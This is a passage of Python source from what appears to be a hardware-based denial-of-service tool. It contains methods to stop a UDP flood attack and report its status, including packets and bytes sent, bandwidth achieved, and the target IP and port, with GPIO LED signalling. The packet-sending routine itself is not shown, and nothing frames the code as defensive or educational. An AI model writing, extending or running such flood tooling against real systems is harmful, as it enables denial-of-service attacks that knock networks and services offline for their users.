                "packet_size": packet_size,
                "packets_per_second": packets_per_second,
                "duration": duration if duration > 0 else "continuous"
            }
            
        except Exception as e:
            self.gpio.strobe_error()
            return {"ok": False, "error": f"UDP flood start failed: {str(e)}"}
    
    def stop_udp_flood(self):
        """Stop the UDP flood attack"""
        try:
            if hasattr(self, 'flood_active'):
                self.flood_active = False
                
            # Wait for LED animation thread to finish
            if hasattr(self, 'led_animation_thread') and self.led_animation_thread.is_alive():
                self.led_animation_thread.join(timeout=1.0)
                
            # Calculate final stats
            if hasattr(self, 'flood_stats'):
                duration = time.time() - self.flood_stats['start_time']
                avg_bandwidth = (self.flood_stats['bytes_sent'] * 8) / duration / 1024 / 1024  # Mbps
                
                stats = {
                    "ok": True,
                    "message": "UDP flood stopped",
                    "packets_sent": self.flood_stats['packets_sent'],
                    "bytes_sent": self.flood_stats['bytes_sent'],
                    "duration_seconds": round(duration, 2),
                    "average_bandwidth_mbps": round(avg_bandwidth, 2)
                }
            else:
                stats = {"ok": True, "message": "No active flood to stop"}
            
            # Ensure LEDs are off
            self.gpio._off_all()
            
            return stats
            
        except Exception as e:
            return {"ok": False, "error": f"UDP flood stop failed: {str(e)}"}
    
    def get_flood_status(self):
        """Get current flood attack status"""
        try:
            if not hasattr(self, 'flood_active') or not self.flood_active:
                return {"ok": True, "active": False, "message": "No active flood"}
            
            if hasattr(self, 'flood_stats'):
                duration = time.time() - self.flood_stats['start_time']
                current_bandwidth = (self.flood_stats['bytes_sent'] * 8) / duration / 1024 / 1024 if duration > 0 else 0
                
                return {
                    "ok": True,
                    "active": True,
                    "packets_sent": self.flood_stats['packets_sent'],
                    "bytes_sent": self.flood_stats['bytes_sent'],
                    "duration_seconds": round(duration, 2),
                    "current_bandwidth_mbps": round(current_bandwidth, 2),
                    "target_ip": self.flood_stats['target_ip'],
                    "target_port": self.flood_stats['target_port']
                }
            else:
                return {"ok": True, "active": True, "message": "Flood active but no stats available"}
                
        except Exception as e:
            return {"ok": False, "error": f"Flood status check failed: {str(e)}"}